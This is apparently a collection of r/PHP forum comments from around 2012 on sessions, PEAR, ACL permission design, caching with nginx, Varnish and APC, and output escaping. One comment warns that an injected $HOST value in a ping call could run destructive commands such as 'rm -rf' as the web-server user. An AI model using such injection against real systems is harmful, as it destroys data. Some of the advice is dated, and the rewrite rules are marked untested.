Then do it from the command line and save yourself tons of time. I don't know exactly what you want, but I imagine you'll need an instruction interpreter class, a monster class and an encounter class. The interpreter is just a big factory that takes an argument from stdin, runs it through a case and takes the appropriate action. The monster class has a variable `health`, a constructor with health as a parameter, and two functions `add` and `subtract`. The encounter class has an array `monsters` and two functions `add(monster_alias)` and `subtract(monster_alias)`. I'll try and write something to explain it better in a bit...
You're not starting a new session. `session_start()` checks for an existing session (i.e. with a `PHPSESSID` cookie or query string (i.e. "`GET`") value) and loads that if it's there. If the value doesn't exist, a new one is created and is associated with a new, blank session.
Are you calling `exit()` after you do your redirect? I would think `session_write_close()` would handle this, but it's possible your first script is holding the session open while the second request starts (remember that without an `exit()`, PHP keeps running a script even after a redirect is issued). I would expect that the first request would block the second if you're using file based (i.e. "default") sessions rather than your own session handler, but it's worth looking into anyway.
Nah, people who program just use a lot of jargon that's hard to decipher if you're new. [I wrote up a little outline if you want to play with it and figure out what it all means](http://pastebin.com/qDyqSvYF). You'll have to run that from the command line. It's simple, kind of does what you said you wanted (probably not in the way you envisioned). I was going to make the commands OO (abstract command class with finite sub commands, which makes it easier to add commands to the interpreter) but I got lazy and will leave it as an exercise to the reader. Enjoy!
Haha no worries. I did it for fun too
Github is pretty good, but i feel that it's not really the best place for PHP Modules, there is a few over there, but not that many PHP developer use it, and it's not that easy to browse. It's a good alternative to PEAR, but honestly PHP is missing a gem or simply a real modern package repository. There is quite a few initiative ([Phark](https://github.com/lox/phark), [Packagist](http://packagist.org/),...)out there, but i feel like we need a big PHP players (Zend, Symphony, ...) to either jump on one of them and make it standard for the PHP community. Or for the PHP Core Team to launch a real initiative. That would do a lot of good for the language.
I see your RFC and I rise you real life case. All the browsers support partial URL, so I see no harm done.
Look for an LDAP implementation. Do not write this yourself. There are lots of great open source solutions to this. The LDAP databases have been heavily optimized for authentication and authorization. They have users, groups, and permissions. This is a very well defined problem space that is already solved. 
[cURL](http://php.net/manual/en/book.curl.php) or [fopen](http://uk.php.net/manual/en/function.fopen.php)
cURL would be the best bet. file_get_contents might work depending on it it throws a catchable error. try { $feed = file_get_content('http://someurl.com'); } catch (Exception $e){ die('couldn't get feed content because:'.$e-&gt;getMessage()); } Problem is it might take a long time to fail. 
Look at using a hash for the permissions so you have 1 column instead of N. Then just parse that apart when the user logs in as part of authentication. Downside of doing such is, you can't do SQL reports easily for user permissions(who has what). But it depends on what you are looking for. You gain flexibility of adding privileges on the fly with no DB schema updates which I see as a big plus for the client. Look at Zend_ACL, you can define roles that have access to certain things. [http://framework.zend.com/manual/en/zend.acl.html](http://framework.zend.com/manual/en/zend.acl.html) I would also look at using Zend_Auth for your login system versus the current one you are using. Reason being, that for security items, while sometimes writing from scratch may be easier, you want some things that have been widely been used/tested. You can hook in your current db schema to the Auth database adapter. These items could be used standalone, and you don't need to use the whole framework. Just those classes.
Don't do this: 0. Pinging a host doesn't mean that a URL exists 0. Many servers reject ICMP packets 0. "ping" may not be available on the local system 0. Even if ping is available, the web server might not have access to run it 0. Even if ping is available, "-c" might not be a valid or useful option 0. etc.
Yes, I have been wanting to look into this after reading a blog post on it. Looks promising.
crude basic way to do it would be $headers = get_headers($url,1); if ($headers[0]== 'HTTP/1.1 200 OK') { // ok } 
Here's the function I've been using for a while. function url_exists($url) { $hdrs = @get_headers($url); return is_array($hdrs) ? preg_match('/^HTTP\\/\\d+\\.\\d+\\s+2\\d\\d\\s+.*$/',$hdrs[0]) : false; }
I'm reading the Zend ACL manual and this method seems really good and definitely worth looking into. I am a little confused about how this method could possibly not require any database schema changes. You just make the single column a hash? I'm assuming that's just a string that can be used by PHP to determine the user permissions? Like a set of ones and zeroes.
Also, if someone manages to inject their own $HOST. They could execute processes in the context of the web server user (rm -rf) 
A general purpose version of the WordPress plugin repository would quickly get a lot of people onboard.
Everyone hates PEAR because most of the modules are bloated, poorly written, and fragile. THat's not to say all of them are, but the *vast majority* are. Sadly, because it could be a really great thing if anyone bother to do any oversight.
Because it's slow and poorly-written - which I happen to know from first hand experience. You really can't build an enterprise application on it, and it's well-deserving of it's reputation. Stick with something like Symfony and you'll be far happier in the long run. However, I'm very glad to hear that your wife agrees with you.
Well, `session_write_close()` is specifically intended to stop a second request from being blocked by an earlier, unfinished one, but I think I see what you're saying. If a lack of `exit()` was causing this, OP wouldn't be seeing a blank session, but rather a blocked second request. It's a good point, thanks.
I think PEAR channels are the best solution to the mess that is the official PEAR channel, but it's still a messy solution. Cross-channel dependencies are a cluster-fuck.
Plenty of good answers here, but I should point out it is "a url" not an. Common misconception with the vowel but the Y sound that u makes gets a not an. Not trying to be a dick, figure it is helpful knowledge, I did not know until I was told and now I spread it whenever it is appropriate.
You're right "just because" is not enough of a reason. The only reason you state not to use it is because it's not in the RFC. It has advantages in code clarity along with not needing to know precisely what environment the code is running in. When it comes to web standards, they are frequently spec'ed retroactively against implementations.
Yeah, you use binary operations (BITWISE) on a single integer field allowing you something like 63 unique permissions per field. Google up a few articles on it, there's plenty, and that should get you looking in the right direction.
Some people pronounce URL "earl" so "an URL" is not fully crazy, only partially crazy.
fair enough
Looks very similar to what is being described in this article: http://webdevrefinery.com/forums/topic/3280-how-to-make-a-user-account-system/ (posted by Exylon)
I'm sure about the downsides tbh - I've never implemented a system this complex but it's how I'd approach it given the OP's requirement to have very granular permissions. Regarding the specific point about permission overrides I would propose that a blank list cannot be used to negate permissions, rather a banned group would have all it's permissions set to 0. Then you could use an aggregate function to produce a correct list of duplicate permissions e.g SELECT permission.name, MIN(permission.value) FROM user LEFT JOIN type ON user.type_id = type.id LEFT JOIN type_permissions ON type.id type_permissions.type_id LEFT JOIN permission ON type_permissions.permission_id = permission.id WHERE user.id = 1 GROUP BY permission.id so regardless of how many groups implement a specific permission a 0 value would always override everything.
I thought we were talking about code quality here. Ok, since we cannot easily point to bad coding, I will debate the PEAR reviewing process, for fun. 1. So PEAR sucks because people actually look at what gets thrown in the repo? Have you ever been through a codebase that is not peer-reviewed? Drupal's [module section](http://drupal.org/project/Modules) is a good example of coder's gone wild without supervision. I love Drupal, and use many 3rd party modules, but hey ... it's a jungle in there and you have to pick and choose. I could give you many, many examples of badly coded Drupal modules that would of certainly been better off not included in the Drupal repo. You have to pick and choose, and having the packages peer reviewed does weed out a lot of the crap. 2. Competing packages and frameworks not allowed, this does not alter the code quality one bit. I actually do not mind having people concentrate their effort to make a particular package better, rather than re-inventing the wheel. Again, to use Drupal as an example, one has 3 different options/modules to create relations between content-types. All 3 are incompatible with each other, and all have their pros and cons. It is like this for translations, SSL redirection, adding a WYSIWYG editor, menu builders, and most any other task you try to do in Drupal. This gets *very* confusing, and leads to incomplete solutions where if they would of merged their ideas, the result would of exceeded the sum of the work that was put in. Instead, one has to waste hours/days to learn the ins-and-outs of every package available for a particular task. For these reasons, code duplication should be avoided, but that is my opinion. 3. *Any coding standard is* **better** *than no coding standard*. Right? 4. *Any version control is* **better** *than no version control*. One does not use a package just because it is hosted in a Git repo, just in the way one *should not* avoid using a well written class just because it's hosted on a svn repo. Again, comparing apples to oranges (PEAR vs. RubyGEMS) is pointless, *unless one can be specific on the code itself*, I see no reason to miss out on the time-saving it brings. Wife is clapping in the background. +1'ed your posts for the interesting feedback, thanks guys. 
I like the way PhpBB does it. Users can be in multiple groups, and groups can have individual permissions set to "Yes" "No" or "Never." When they merge, a Yes overrides a No, but a Never overrides a Yes.
 Allright, please point out what does not work in Archive_Tar, (never used it myself). If you had to slap up a simple script that needs to manipulate tar archives, extract, add files, remove files, list content ... you would actually go and write that yourself? Would your code be fully documented and re-usable? Could you do this in a reasonable time frame? Could you please point out the lines that could be optimised? I have never used this myself, but looking at this class, I am pretty confident using this, I could do the job in minutes, **not** days. Again, just opening a file and saying it is crap is not much of a counter-argument. Anyone can open any PHP file and say that. I use Drupal, Symphony and lately Silex in my projects. But the backend stuff, server tasks, deployment utilities and such, I have never seen anyone use a framework for that. I guess there are people out there that do. 
Doesn't the RSS reader report errors? I'd check for those first instead of doing a check, then reading. (Reading a URL is going to be a fairly slow operation and doing it twice if not needed would just make everything slower.)
A URL will *always* exist. What you want to check is what kind of resource the URL points to, whether the URL is *valid*. I know that sounds pedantic, but it does help to keep the concepts separated.
Archive_Tar is used by the PEAR installer, so it's used by thousands of developers, on thousands of archives, successfully, every single day.
The problem with PEAR (1), is that it is aging. We know better, as a community, how to do things. We've learned from those around us (ruby, java, .NET) new and different (though not all good) ways to do things. The majority of PEAR stuff is still PHP 4 compatible. PEAR 2 (pyrus) is shaping up pretty nicely, and brings PEAR into the PHP 5.3+ era. I find that the most compelling feature of PEAR (1) these days, is the package manager and channels functionality. It is a great distribution and dependency system, as evidenced by tools like PHPUnit and many frameworks that use it successfully. Perhaps you missed the fact that your vaunted Symfony (yes, Symfony 2 even!) is available via a [PEAR channel](http://pear.symfony.com/)? I've written about a dozen packages for PEAR; though almost a decade ago now, it had and still has a great framework around development. Well documented (and accepted!) code standards, peer review, and good revision control workflow. Am I proud of my old code? Yes. Would I use it today? Probably not.
type it into the address bar
Gotta love teachin' them computers.
And redirects?
You'll have to read up on that a bit yourself. [Start here.](http://stackoverflow.com/questions/3519939/make-curl-follow-redirects)
Ehm. That's your complaint? PEAR is compatible with PHP4? I never understood this. Why is everyone so bent on incompatibilizing for the sake of incompatibilizing? It's one thing to drop baggage, but to adopt new fugly syntax just for making it incompatible to PHP 5.2? You do realize that 5.3 still hasn't reached 20% spread yet? But this does indeed highlight a cargo cult programming deficiency with that project. PEAR1 is all PHP4, and the next version PHP5.3 only. But zilch in between. That's a clear case of policy circlejerking over working code. And an actual reason people avoid it like the plague. And don't think they droped the single quotes enforcement in their coding standards yet (because it's faster, or whatever). Which is why I can't be bothered to try to send any patches.
Linux/Apache may not care, but if it is on Windows it can sometimes cause weird issues. Also some modules such as mod_security can be configured to check for this exact thing as it may be a session spoof attack. Also if you're paranoid like me you'll ignore POSTs/GETs that come in from anything other then 80 and 443 just to plug one more hole. I've also seen some sites not allow even crossing between 443 and 80. Switching between the ports will reset your session. 
You want to look up ACL, and role-based permissions.
Well that's a check for headers (and according to the comments a relatively slow one), but if the file exists then ostensibly the reader will want to fetch the feed. In that case just getting the headers is overhead, especially RTT. Instead of the try/catch from warmans' comment, I'd go with [file_get_contents()](http://php.net/manual/en/function.file-get-contents.php) and then get the HTTP code from [$http_response_header](http://www.php.net/manual/en/reserved.variables.httpresponseheader.php).
Wow, TIL. Gotta start doing that from now on.
phpclasses.org is cool and been around for a long time
yeah, escapes the command.. but you shouldn't need to be in a position where you need to escape anything to stay safe. 
the weird PEAR coding standing makes me hesitating a lot when consider to contribute to it. It is way too different from many people's common practice. and it has to be followed strictly.
Note that documentation lookups will be unaffected; only the front page will black out, so those needing to do work will still be able to refer to the manual.
A notice bar on the English doc pages at the top would have also been nice.
FYI the site is up to date with SVN: http://www.php.net/index-sopa.php Edit: On a related note, will http://americancensorship.org/ be able to keep up with the massive traffic increase?
This will still mostly be preaching to the choir, but every little helps.
The OP claims to that his app is CPU intensive. To me that means he's probably running some sort of plasma flow simulations or locating black holes. Those are not appropriate tasks for PHP. Sure it can be done in PHP but you'll pay an arm and a leg in CPU time.
This is one of many reasons I support and use php!
http://php.net/manual/en/language.oop5.php this should cover what your chasing
I hardly ever use date() for more than Y-m-d. For localized strings I'd prefer strftime(), thats a sucker to remember! 
HTML is much more then about tags. 
If you still don't know about some of PHP's core OOP functionality, and to learn it now you just want someone else to do all the research and summarise it for you, then actually I would have to class you as 'bad'.
I agree with the sentiment and support the action they're taking but I do wonder how effective it will be. I think sites which senators use; Google, Facebook, Youtube, would be the ones which would case maximum damage.
Simple: `curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);`
i dont like how it sets up the permissions, a proper acl list like used in windows would be better, allowing a change in permissions on a specific object. setting your types of permissions as constants would be ok SESS_ADMIN = 1, SESS_STORE = 2, SESS_USER = 3, but you would want to be able to change permissions on a specific object. you would still want to create groups on the fly, set permissions on objects for groups or individual users.
There's perm_override_remove and perm_override_add column in the users table to add/remove permission on a specific user though.
I see where you're coming from, but it is kind of your fault. The things you're asking about aren't really specific to PHP. They are just really about object oriented programming in general. So you need to get some good books about OOP.
Yep, the permissions is stored in the column permissions in the groups table, so a user associated with a group will be affected by the associated group permissions.
There is nothing inherently wrong with PHP 4 code, but you can built better, more efficient code with PHP 5. PHP 5.2 is no longer officially supported, it was EOL'ed 18 months ago and hasn't had a release in over a year. Therefore targeting 5.3 makes complete sense. Where do you pull that 20% 5.3 adoption statistic? *Technically* single quotes are faster (interpolation is slower, but it's not worth caring), but you are incorrect that the coding standards even dictate their usage, in fact the manual explicitly [says otherwise](http://pear.php.net/manual/en/standards.bestpractices.php).
Damn. It was going to be my excuse to ski instead of work on Thursday.
There's also "interface" which is similar to "abstract". In an interface, all methods must be public, and the bodies are left undefined. Another class implements an interface with the "implements" keyword. For additional information / clarification see: [Object Interfaces](http://php.net/manual/en/language.oop5.interfaces.php)
Here's a tip: you can go to http://php.net/word to look up "word". It works for a lot of things, eg: http://php.net/private
Good. Reddit being down means I have to work. No php.net means no work
The first thing you should do when something is taking up too much of your resources is to off-load those parts. That means caching. Not only should you consider compiling pages into static files wherever applicable, but you should also see to it that caching happens on the client-side as well. 
There's a large trend of building static file websites (blogging platforms especially). Check out [Jekyll](https://github.com/mojombo/jekyll) for example, it's quite popular and something worthwhile to check out for inspiration if you want to roll your own. A couple things to consider as well: 1. Apache is pretty heavy. Have you considered using nginx instead? 2. If you're going to be deploying something so simple, make sure you're disabling extensions in your web server that are not used. Any extensions or modules that are being loaded, but not used, is terribly wasteful. ed: grammars
I don't know how much I trust those statistics; they miss Facebook in their list of sites using PHP 5... that's quite a big (and obvious) one. I'm well aware of real world usage, and even in higher education I see usage of PHP 5.3 (and higher ed is notorious for lagging behind on technology uptake!) Good for you on that patch — if you get any hassle, send me a PM and I'll cite the manual on your behalf (I used to be a member of the first PEAR QA Team).
This right here is the issue. Too many config vagaries to make specific suggestions but it certainly sounds like something isn't done correctly if just using php to include some files is eating gobs of RAM -- too much is allocated to each process.
For starters, APC. I also highly recommend using Nginx over Apache, as it consumes far less memory. You can use the savings for caching, assigning some of it to APC. You can use built-in PHP functions to cache fragments of your PHP scripts to APC (such as your header and footer) to further reduce processing time when the page is assembled. Also, I've read good things about Varnish and my informal tests show a significant improvement in speed under heavy load. Blitz.io and the Apache Bench tool both show a 50% reduction to response times for cache hits right away, and it stays uniform as the test progresses, instead of having response times increase as the test progresses. (I'm using WordPress, which is a pretty large script, so YMMV.)
Might want to go ask in /r/wordpress .
nginx is quite a bit faster and less intensive at serving static content
Sure, nginx still performs better under load.
Good catch. :-)
I cant be sure what your input interface is, but sessions are able to store datastructures that are much more dynamic than tabular data that you would store in a SQL database. You can store *any* data structure in the session. This means arrays, objects, arrays of objects, arrays of arrays, etc: class Monster { public $name; public $health; public $armor; public function __construct($name, $health, $armor) { $this-&gt;name = $name; $this-&gt;health = $health; $this-&gt;armor = $armor; } } $monsterA = new Monster("Alice", 20, 100); $monsterB = new Monster("Bob", 15, 150); $_SESSION["monsters"][0] = $monsterA; $_SESSION["monsters"][1] = $monsterB; You could then later retrieve them by their index: $_SESSION["monsters"][0]-&gt;health -= 5; You could also wrap mapping the keys to an object: class MonstersIndex { public $monsters = array(); public function addMonster($key, Monster $monster) { $this-&gt;monsters[$key] = $monster; } public function getMonster($key) { return $this-&gt;monsters[$key]; } } 
file_get_contents is *painfully slow* when compared to cURL
If the only thing php is doing is including a header / footer, switch to virtual includes instead (also called SSI or server side includes).
If you are on a dedicated host, PHP-FPM with APC and Nginx is a great way to replace Apache+PHP with something that is both faster and takes up waaaaay less memory. PHP-FPM is fairly new (and does require 5.3 or better for stable usage) but it is starting to be the de-facto "best" way to host PHP using Nginx as the front-end, unless you absolutely need Apache for some other reason (like other Apache modules or something). There are lots of guides out there that build from source, but if you are on Ubuntu it can be as simple as installing via aptitude and then following the basic configurations. If you are on a shared hosting setup, then using static pages may be the only way to go though. :-( 
OpenID is one way of having accounts external to the system, although you still need permissions on access setup tied to those accounts, i would tend to create a local account from the OpenID data, but still use the OpenID to login, failing that check the local account and ask for a security key or something. Limits portability as in your stuck as intranet style LDAP logins and you need AD or the like, again, i would tend to create a local account using the info and when not using an LDAP environment use local accounts (or openid with local accounts), and then theres standalone apps that run on single machine not connected to a network. Has to be local account. And building it yourself, you know your code, its easier to fix, change, etc. However, I do agree in that it is not for the intermediate, but more for the advanced developer. For instance i have been working with the same CMS developed internally for 8 years, and in that time it has improved tenfold.
I'd also throw in an option to use Smarty or Twig. Either of those can be cached (kind of fake caching, in reality) but they do relieve some processing for those static bits. Also, unless your host is set up to serve .inc files as .php, I wouldn't use that extension. Most of the time, apache just serves .inc as text, meaning people now have your source. .inc.php works as well, just make sure that if you navigate to whatever file from the greater internet that your source isn't exposed.
Ummm thanks for not helping anything, why not provide other solutions for the OP??
It's 4pm and that's the most retarded statement I've seen on reddit all day. Caching *does* help, a lot. It helps in that you don't have to regenerate the page on every load, it serves what's akin to a static html file; a lot easier. @OP: Nginx, php-fpm, varnish. I can get those three plus MySQL running on under 100MB of memory and it runs perfectly stable. I'm sure you'll be able to figure out something. If you need a hand, PM me.
Buy a bigger server. What do you consider to be high traffic? That means different things to different people.
[nginx also has the ability to cache FastCGI responses](http://wiki.nginx.org/HttpFcgiModule#fastcgi_cache). Using nginx's fastcgi_cache well can turn a decent proportion of your hits into static pages (depending on the site) and nginx is excellent at pumping out static content. For a situation like the OP's where there's little dynamic stuff it sounds like it could eliminate the need for a separate cache like Varnish or Squid.
Also move your assets onto a different server or cdn, like akamai.
That would make sense. Especially since it has a "canonical redirect" system that tried to keep Google from indexing multiples of pages... I'll have to look into that, thanks.
How do you use varnish on "php pages" that change rarely but are accessed frequently, exactly? On one of my servers, I'm using varnish now, but basically using it to serve up all static files unless it's a PHP script, in which case nginx/php are invoked. The tutorials I'd read separated things out by filetype, so all PHP requests are passed through to nginx... I imagine there are numerous better ways?
&gt; What kind of traffic are we talking about? tens or hundreds of thousands of page requests per day... &gt; How is PHP configured? Apache module on my physical colo box... fastcgi/nginx on my linode. &gt; How much RAM is each PHP process consuming in a typical page load? On the colo box, not sure, since it's an apache shared module and I'm not sure how to check that... 
thanks, I'll definitely look into PHP-FPM for future plans. For current plans, until the OSCommerce site I host for someone else gets its stuff together, PHP 5.3 would break it... :-\\
You could also look into client-side templating with a solution like icanhaz.js and Mustache.js.
&gt; This is the sort of response I expect out of someone who has never had to build a system specifically designed for high traffic applications. Is SkepticalMartian talking about their own post?
For a documentation system I built for a programming language, the main page is generated on request, but the content is all pre-generated HTML files pulled down with AJAX. All files are regenerated when it is updated. The files are then set to be cached. As a lot of requests are for navigating the docs, including a lot of repeat browsing, it makes the site a bit leaner. It's a nice example because I didn't need to setup a caching system on top to get the same effect. I just have PHP generate the files, and then NginX serving them like it would with CSS or images.
A great book to start on is "PHP Objects Patterns And Practice".
In your MySQL database go to the table: **wp_options** In the **option_name** column look for **site_url** and **home** and change the urls in the **option_value** to the correct ones. That should solve your problem
I find myself preferring redis these days for key-value memstorage. Tje feature set present in redis beats memcache hands down.
There are many kinds of information... personal information, financial information... Permissions, centralized control and well reviewed code are all your friends with these kinds of information. Local accounts work great for the first and only application. When everybody had this attitude 20 years ago the result was multiple admins having to add and delete accounts from multiple systems each time a new employee was added. It was and is a huge pain in the butt, it lead to very insecure applications when an employee left and one or more of the admins forgot to remove the employee. As much as I dislike Active Directory, Directories serve a very important purpose. When an employee logs in, all applications can go to a central place to check the user is still an employee. A single admin can remove a user from the directory and be assured that the user is now blocked from logging into every application. Handling login information is also tricky. Encrypting passwords is a small step, how hard is to forge your authentication tokens? Can authentication tokens be shared across applications? Can the servers involved be trusted? Do you have a valid certificate repository? Sorry to belabor the point, but you are creating a huge problem for someone. Learn the industry standard approaches an use them.
Hundreds of thousands of page requests per day is only several requests per seconds. That doesn't sound like a lot. Do you use a dedicated physical machine for this?
The quick, rough and ready that doesn't require using something like varnish is to run a wget / curl job that indexes a static version of your site in a subdirectory (and optionally a gzip copy of each file also), so you end up with a directory like (the folder name represents that page name): static_cache/index.html static_cache/index.gz static_cache/folder1/index.html static_cache/folder1/index.gz You then write some gnarly nginx or .htaccess rewrite rules like so (you can also add cookies / checks to see if they are logged in or other conditions requiring to show the real pages). This is untested but is merely giving you the idea / hint how to do it. &lt;IfModule mod_rewrite.c&gt; RewriteEngine On RewriteBase / AddDefaultCharset UTF-8 RewriteCond %{REQUEST_URI} !^.*[^/]$ RewriteCond %{REQUEST_URI} !^.*//.*$ RewriteCond %{REQUEST_METHOD} !POST RewriteCond %{HTTP:Accept-Encoding} gzip RewriteCond %{REQUEST_URI} /(.*)\.html$ [NC] RewriteCond %{QUERY_STRING} !.+ RewriteCond %{DOCUMENT_ROOT}/static_cache/%1.gz -f RewriteRule .* static_cache/%1.gz [L] RewriteCond %{REQUEST_URI} !^.*[^/]$ RewriteCond %{REQUEST_URI} !^.*//.*$ RewriteCond %{REQUEST_METHOD} !POST RewriteCond %{REQUEST_URI} /(.*)\.html$ [NC] RewriteCond %{QUERY_STRING} !.+ RewriteCond %{DOCUMENT_ROOT}/static_cache/%1.html -f RewriteRule .* static_cache/%1.html [L] &lt;/IfModule&gt; Basically, this will take the requested url if it is NOT a post request and try and server a pre-gzipped version if the browser support gzip or the .html version if they don't. The advantage of this over varnish is that you can pretty much put this on any standard hosting without requiring root / ability to install stuff. This is basically the method that WPSupercache and I believe Drupal Boost use.
Won't varnish be serving the static content here?
Setup FCGI (fpm) so you can just have a few php instances running, rather than creating a new one for every request.
I haven't tried that - I'll have to check it out. Thanks for the tip!
Perhaps use PL-SQL, Transact-SQL, or PL/pgSQL rather than MySQL. Let the database handle the easy stuff. When the jobs are so small, the bottleneck is the data transfer between servers, so just let the DB machine handle it.
true, but the static content still needs to be served up initially by the web server...depending on the amount of static content, you could still get a high load when initially populating the cache. for most sites this really wouldn't be an issue though and varnish would pretty much take care of this except for the first loads.
~100k scripted requests in ~300 seconds under if statements sounds work that MySQL can handle. Have you tried passing all the work to MySQL? triggers?
No, I'm talking about the fact that there are times when caching *isn't* a possible solution, and yet you have to build a system that handles the load anyway.
MySQL supports [Event Scheduling](http://dev.mysql.com/doc/refman/5.5/en/events-overview.html) and [Stored Routines](http://dev.mysql.com/doc/refman/5.5/en/stored-routines.html) just fine. They aren't quite as expressive as PL/T-SQL but they are most likely more than suitable for his needs.
Cool, I did not know about MySQL Event Scheduling. Thanks!
Someone already suggested [Varnish](https://www.varnish-cache.org/), which is a good suggestion for caching mostly unchanging page content. Another simple solution, if you're using nginx, is to make use of its [Memcached module](http://wiki.nginx.org/HttpMemcachedModule). If your PHP application can put the rendered page into memcache (ob_start() with a callback function works well here), nginx can serve the content directly from memory without ever having to touch the backend. Just remember to disable memcache compression if the pages are on the larger side, as nginx doesn't support it.
FYI, mod_php under apache doesn't create a new php process for every request. Pretty much the opposite actually. It basically builds php into Apache itself so that another process isn't required at all. Which isn't to say that php-fpm isn't a better choice for this guy, just wanted to be clear :)
I don't mean to imply that using js in general is poor practice. Heck I'm the guy behind about 15k lines of it in RES. I just mean that for things like highlighting the active page in navigation, that probably ought to function even for people with js disabled. 
No you don't, it isn't important.
Crossing from SSL to plain HTTP can appear to reset your session, what is happening here is that the session cookie is marked as secure only and the *browser* refuses to send it unencrypted. You cannot tell what port a cookie was created on and therefore cannot block it on that basis.
You should only *ever* use htmlentities() where it is designed to be used: Outputting HTML to a browser. The advice from that book is ludicrous! (tho not surprising). Practically all learning materials for PHP are like that ;/ That's why I started writing my own. ------ Here's a piece of code from PHP University's Driving Car library: $escapedText = htmlentities($text, ENT_QUOTES, 'UTF-8'); That's how you should properly use htmlentities\(\) in 2012. The driving app works on both via the command line and the browser using that one convert function. See: http://repo.phpexperts.pro/driving_app/ If I had used htmlentities() everywhere, then it wouldn't work on the command line very well, see?
... and even then you shouldn't use it. Use htmlspecialchars() instead.
Are you sure you're not confusing HTML with HTML+CSS+JS+AJAX?
Or you could just buy or download (for free!) a theme. Designing is done by other ... less expensive ... people these days.
However, security through cumbersomeness doesn't work. You do need a wrapper function for that. Carrying around the parameters won't make people gonna use it. Especially for output which occurs repeatedly and at various places throughout the application logic. Call it `h()` or something, and it becomes a practical option for output encoding. And I presume this is why newcomer books recommend the less optimal approach: it's less effort.
Other mentioned Varnish already, and with making sure APC is turned on, it is the only thing you'll need to do for a very static websites. Unlike other folks here, i would not recommend switching to Nginx and PHP-FPM. It is a useless overhead for you to do, with little gain (at high traffic the difference is not that great, with a well tuned Apache+PHP5.3 taking the best, as FPM and Nginx tend to have stability issues that more robust Apache+mod_php just don't have). At high traffic, on a static driven website, installing Varnish is a simple enough solution which will relieve your backend stack for little setup work. If you have questions, do not hesitate as i have a lot of hands on experience and would be happy to help out.
Actually.. In my first comment I said that I would use regular expression and then phpexperts_pro said that is not the way to do it... which confuses me. I would use regular expression to make sure only letters and numbers were put into the form fields. In addition to that, I was wondering about how to properly deal with if someone threw in malicious characters as you mentioned. I already know about the differences and risks and whatnot, but I was not familiar with the proper PHP functions (if any) that help filter out that sort of stuff.
Only if you need escaped HTML entities for some reason. You should look into [filter_var](http://php.net/filter_var) and [filter_input](http://php.net/filter_input). You need to ensure that your inputs are exactly what you're expecting and work for your purposes, not just run them through functions that don't make them secure. htmlentities() isn't (necessarily) going to make your data database-safe for example. Use the right tool for the right job.
Don't have the time for this right now, I'm sorry. Is it really necessary to get out a library like ImageMagick to do something that can be accomplished with GD just as easily?
This is done prior to adding the watermark (which is the part that has the artifacts). With that being true, do you think changing that would still help?
So why would the artifacts only show up around the watermark? All the images are JPG and the watermark is a PNG. Thanks for the help BTW.
what was the issue?
Though there is a PHP-based solution to this, it's probably better to use your database language to determine the needed information.
Oh, really? Try checking the watermark file for the artifcats. If it wasn't properly saved to be adaptive, it may contain leftovers in shadows, text AA etc
Do two passes. First find the highest value, then use that while rendering the table.
Two queries, one that gets the max of each column, one that pulls back all the data.
Read this: http://www.reddit.com/r/PHP/comments/nj5t0/what_everyone_should_know_about_strip_tags/ It might not be wholly relevant this time, but it will be at some point.
JPEG is a lossy format. There will always be loss.
You deemed it important. It is not important. You received a downvote. You shouldn't follow it because there are no benefits to it.
As a beginner, you should get in the habit of breaking up your "get"ting data from your "show"ing data. Don't just run inline database queries and spit out the results. With that in hand, when you're getting the records from the database, assuming you're not using an ORM, just do a check to see if you've found a higher value than the current max. Then, do a separate loop through the records, and if the record matches the current max, add a highlight class to the table row. This also means that if you have two records that *both* meet the max value, they'll both be highlighted. Unlike the other suggestions in here, that means that you'll only have to do one query, and your presentation and data layers will be separate.
Won't that require two hits to the database? One to request the records to populate the table and one to request the totalling information.
This is a little tangential but these will help you validate data. Of course, you will need to do something if the data isn't valid, but this will help if you are writing regexes for everything
This will return a lot of iterations of "winner" - it will give out the id of the winner with every single row pulled. I don't know how mysql runs subqueries in selections like this, but there is the decent chance of running this subquery with every row, which would be pretty inefficient. I think doing two queries, "SELECT MAX(sales) as maxSales FROM tableName" and "SELECT * FROM tableName" is probably the best way to go if you want to answer it through mysql. 
Is all this less resource/time intensive than just doing "SELECT MAX(sales) as maxSales FROM tableName" ?
I could really use this, came at the perfect time too. Will try it out and get back to you.
Just replace the [code] blocks first. It doesn't really have to be that complicated.
Could you please explain what you mean? The loops are there to ensure that nl2br only happens outside [pre], [list] and [orderlist]. I need something like this in the class otherwise you will get a whole bunch of line breaks inside pre and lists. Do you know a better way of nl2bring it? I'd be very happy to hear it as, whilst I understand that the loops are quite a poor method of parsing, I personally don't see any other way :/
If I were going to do this the really stupid-simple way, I'd match all [pre|list|orderlist](.*)[\$1] blocks, replace all newlines in that middle term with a magic character, nl2br the whole string, and then replace the magic character with newlines. It's only about 4 lines of code and should be much quicker. That's not necessarily the best answer, but an easy one.
You might want to check out some of this code do a little comparison see what you like that pear did. http://pear.php.net/package/HTML_BBCodeParser/redirected
Hmm that sounds pretty easy. I might try that, thanks.
 SELECT ..., (subselect)
That was due to poorly optimized refreshing of project files. They've now optimized it, and also given you the option of disabling it as well. 
Better yet, the pear class is unmaintained; if the OP is interested in writing this type of package, they might consider adopting it.
TIL People turn on word wrap when coding.
Which version of Netbeans are you running? I'm on 7.1 and I saw no updates when I checked a minute ago.
OP said his DB *is* relational, so it would benefit from a SQL structure. Supposing each simulation knows which row it "owns", it's just an index lookup, which is always in-memory anyway. InnoDB does row-locking not table-locking on writes, so that should be fine.
Been using 7.1 on ububtu for about a week now and can't complain about it cause the xml tag completion saves me at least 30-40 minutes a day.
That depends entirely on what you want to do. htmlentities is perfectly fine to use for escaping, it will just escape more characters than htmlspecialchars will.
I just updated to the latest 7.1 iteration from 7.0.
It depends what you are coding. I doubt many turn it on for actual code, but when you work with html it really does help.
[updated](http://www.reddit.com/r/PHP/comments/ojb1w/i_need_some_advice_on_running_a_high_volume_of/c3hqsr1) my thoughts
Overlapping is my biggest fear, so i think "Option B" (as defined in the thread text) is probably the best solution. The problem is, there are two states: one which updates the raw data regularly for each item, and another when the individual items are offline, thus a central scripted request which handles each request for the associated items. In the first state, the simulations are run locally. In the latter state, the simulations must be handled on the server. The answer came down to basic math, a few dozen iterations of a 200 or 300 line algorithm (per each request) every 60 to 300 seconds will be easier to handle than several hundred thousand iterations every 60 seconds. The execution time will still be under 1 second, perhaps only a tenth of a second more than a regular request. This might not scale nice when scripted requests jump into the millions, i can always change it to handle the simulations in the background. And even then, the simulations dont really need to be run every 60 seconds, they can accurately scale, im using unix time to trigger events. (thanks to everyone who gave their input)
please explain, what should I do?
Could you possibly give some examples of where caching wouldn't be possible?
I never use it for HTML, seems unhandy to me.
Have you considered WebSockets as real time implementation?
